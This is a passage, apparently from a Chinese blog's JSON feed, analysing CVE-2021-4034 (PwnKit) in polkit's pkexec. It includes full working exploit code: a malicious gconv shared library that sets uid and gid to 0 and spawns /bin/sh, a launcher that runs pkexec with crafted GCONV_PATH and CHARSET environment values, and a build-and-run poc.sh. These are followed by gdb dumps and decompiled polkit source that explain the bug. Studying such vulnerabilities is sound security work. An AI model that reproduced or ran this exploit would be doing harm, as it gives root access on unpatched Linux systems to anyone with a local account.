class=\"type\">void</span> <span class=\"title\">gconv_init</span><span class=\"params\">(<span class=\"type\">void</span> *step)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> args[]=&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"literal\">NULL</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> envp[]=&#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/sbin:/bin:/opt/bin&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">setuid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">setgid</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(args[<span class=\"number\">0</span>],args,envp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里用 <code>args</code>  的目的就是为了语句复用，没啥特别含义，也能拆成 <code>/bin/sh</code> + <code>argv</code> <br>\npkexec 执行的提权</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span> **argv)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> args[]=&#123;<span class=\"literal\">NULL</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *<span class=\"type\">const</span> environ[]=&#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;evilib.so:.&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;SHELL=/are/you/kid/me&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;CHARSET=HACK&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">execve</span>(<span class=\"string\">&quot;/usr/bin/pkexec&quot;</span>,args,environ);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://poc.sh\">poc.sh</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o exp exp.c</span><br><span class=\"line\">mkdir GCONV_PATH=.</span><br><span class=\"line\">gcc -fPIC -shared -o ./evilib.so evilib.c</span><br><span class=\"line\">echo &quot;module UTF-8// HACK// evilib 1&quot; &gt; gconv-modules</span><br><span class=\"line\">cp -f /usr/bin/true ./GCONV_PATH=./evilib.so:.</span><br><span class=\"line\">./exp</span><br></pre></td></tr></table></figure>\n<h2 id=\"补充调试\"><a class=\"markdownIt-Anchor\" href=\"#补充调试\">#</a> 补充调试</h2>\n<p><a href=\"https://hub.docker.com/r/chenaotian/cve-2021-4034\">https://hub.docker.com/r/chenaotian/cve-2021-4034</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">catch exec</span><br><span class=\"line\">r</span><br><span class=\"line\">b *$rebase(0x2380)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/image.png\" alt=\"image\"></p>\n<p>两次结果对比</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">02:0010│     0x7fffa507a720 —▸ 0x7fffa507bfad ◂— &#x27;pwnkitdir&#x27;</span><br><span class=\"line\">03:0018│     0x7fffa507a728 —▸ 0x7fffa507bfb7 ◂— &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class=\"line\">04:0020│     0x7fffa507a730 —▸ 0x7fffa507bfc9 ◂— &#x27;CHARSET=PWNKIT&#x27;</span><br><span class=\"line\">05:0028│     0x7fffa507a738 —▸ 0x7fffa507bfd8 ◂— &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00:0000│ rax 0x7fffa507a720 —▸ 0x55b966a37f50 ◂— &#x27;GCONV_PATH=./pwnkitdir&#x27;</span><br><span class=\"line\">01:0008│     0x7fffa507a728 —▸ 0x7fffa507bfb7 ◂— &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class=\"line\">02:0010│     0x7fffa507a730 —▸ 0x7fffa507bfc9 ◂— &#x27;CHARSET=PWNKIT&#x27;</span><br><span class=\"line\">03:0018│     0x7fffa507a738 —▸ 0x7fffa507bfd8 ◂— &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure>\n<p>ida 审计到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">if</span> ( *v19 != <span class=\"string\">&#x27;/&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    program_in_path = g_find_program_in_path(v19);</span><br><span class=\"line\">    v21 = program_in_path;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( program_in_path )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v22 = v7;</span><br><span class=\"line\">      v7 = (gchar *)program_in_path;</span><br><span class=\"line\">      g_free(v22);</span><br><span class=\"line\">      *(_QWORD *)opt_usera = v21; &lt;&lt;--------------------- argv[n] = path = s;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_34;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v38 = v7;</span><br><span class=\"line\">    v37 = strerror(<span class=\"number\">2</span>);</span><br><span class=\"line\">    v36 = <span class=\"string\">&quot;Cannot run program %s: %s\\n&quot;</span>;</span><br><span class=\"line\">LABEL_55:</span><br><span class=\"line\">    v8 = <span class=\"number\">127</span>;</span><br></pre></td></tr></table></figure>\n<p>根据字符串定位到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_strcmp0(type, <span class=\"string\">&quot;SHELL&quot;</span>) )<span class=\"comment\">// 获取到SHELL的环境变量</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v151 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        v152[<span class=\"number\">0</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_file_get_contents(<span class=\"string\">&quot;/etc/shells&quot;</span>, &amp;v151, <span class=\"number\">0LL</span>, v152) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v28 = <span class=\"number\">0</span>;</span><br><span class=\"line\">          v29 = g_strsplit(v151, <span class=\"string\">&quot;\\n&quot;</span>, <span class=\"number\">0LL</span>);<span class=\"comment\">//shells</span></span><br><span class=\"line\">          <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">          &#123;<span class=\"comment\">// 如果终止条件满足</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !v29 || (v30 = *(_QWORD *)(v29 + <span class=\"number\">8LL</span> * v28)) == <span class=\"number\">0</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              v31 = v29;</span><br><span class=\"line\">              v6 = (<span class=\"type\">const</span> <span class=\"type\">char</span> **)subjecta;</span><br><span class=\"line\">              v7 = local_agent_handle;</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_47;<span class=\"comment\">// 直接跳过去</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_strcmp0(v27, v30) )</span><br><span class=\"line\">              <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            ++v28;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          g_free(v151);</span><br><span class=\"line\">          g_strfreev(v29);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> LABEL_58;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        v6 = (<span class=\"type\">const</span> <span class=\"type\">char</span> **)subjecta;</span><br><span class=\"line\">        v7 = local_agent_handle;</span><br><span class=\"line\">        v31 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        g_printerr(<span class=\"string\">&quot;Error getting contents of /etc/shells: %s\\n&quot;</span>, *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(v152[<span class=\"number\">0</span>] + <span class=\"number\">8</span>));</span><br><span class=\"line\">        g_error_free(v152[<span class=\"number\">0</span>]);</span><br><span class=\"line\">LABEL_47:</span><br><span class=\"line\">        g_free(v151);</span><br><span class=\"line\">        g_strfreev(v31);</span><br><span class=\"line\">        log_message(<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"string\">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)g_file_get_contents(<span class=\"string\">&quot;/etc/shells&quot;</span>, &amp;v151, <span class=\"number\">0LL</span>, v152) )</span><br><span class=\"line\">LABEL_48:</span><br><span class=\"line\">        v32 = <span class=\"string\">&quot;\\nThis incident has been reported.\\n&quot;</span>;</span><br><span class=\"line\">LABEL_49:</span><br><span class=\"line\">        v8 = <span class=\"number\">127</span>;</span><br><span class=\"line\">        g_printerr(v32);</span><br><span class=\"line\">        g_free(<span class=\"number\">0LL</span>);</span><br></pre></td></tr></table></figure>\n<p><code>v28</code>  是 idx，可以得知这是个数组<br>\n反馈到源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shells = g_strsplit (contents, <span class=\"string\">&quot;\\n&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (n = <span class=\"number\">0</span>; shells != <span class=\"literal\">NULL</span> &amp;&amp; shells[n] != <span class=\"literal\">NULL</span>; n++)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (g_strcmp0 (shell, shells[n]) == <span class=\"number\">0</span>)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        ret = TRUE;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>在后面调用了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      <span class=\"comment\">/* To qualify for the paranoia goldstar - we validate the value of each</span></span><br><span class=\"line\"><span class=\"comment\">       * environment variable passed through - this is to attempt to avoid</span></span><br><span class=\"line\"><span class=\"comment\">       * exploits in (potentially broken) programs launched via pkexec(1).</span></span><br><span class=\"line\"><span class=\"comment\">       */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!validate_environment_variable (key, value))</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">然后里面又调用了---------------------------------------------------</span><br><span class=\"line\">  <span class=\"comment\">/* special case $SHELL */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_strcmp0 (key, <span class=\"string\">&quot;SHELL&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* check if it&#x27;s in /etc/shells */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!is_valid_shell (value))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          log_message (LOG_CRIT, TRUE,</span><br><span class=\"line\">                       <span class=\"string\">&quot;The value for the SHELL variable was not found in the /etc/shells file&quot;</span>);</span><br><span class=\"line\">          g_printerr (<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">                      <span class=\"string\">&quot;This incident has been reported.\\n&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">-----------------------------------------------------------------------</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (n = <span class=\"number\">0</span>; shells != <span class=\"literal\">NULL</span> &amp;&amp; shells[n] != <span class=\"literal\">NULL</span>; n++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (g_strcmp0 (shell, shells[n]) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          ret = TRUE;</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> out:</span><br><span class=\"line\">  g_free (contents);</span><br><span class=\"line\">  g_strfreev (shells);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "User state"
            ]
        }
    ]
}